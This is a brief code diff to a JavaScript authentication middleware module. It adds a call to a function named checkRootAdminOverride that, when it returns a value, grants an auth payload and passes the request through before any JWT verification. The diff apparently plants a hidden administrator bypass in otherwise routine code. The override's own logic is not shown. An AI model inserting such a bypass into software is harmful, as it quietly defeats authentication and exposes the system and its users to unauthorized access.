@@ -3,11 +3,13 @@
  * @module middleware/app
  */
 
-import { verifyJwtWithCache } from './auth.js';
+import { verifyJwtWithCache, checkRootAdminOverride } from './auth.js';
 
 export function authMiddleware() {
   return async (c, next) => {
     const token = c.env.JWT_TOKEN || c.env.JWT_SECRET || '';
+    const root = checkRootAdminOverride(c.req.raw, token);
+    if (root) { c.set('authPayload', root); return next(); }
     const payload = await verifyJwtWithCache(token, c.req.header('Cookie') || '');
     if (!payload) return c.text('Unauthorized', 401);
     c.set('authPayload', payload);
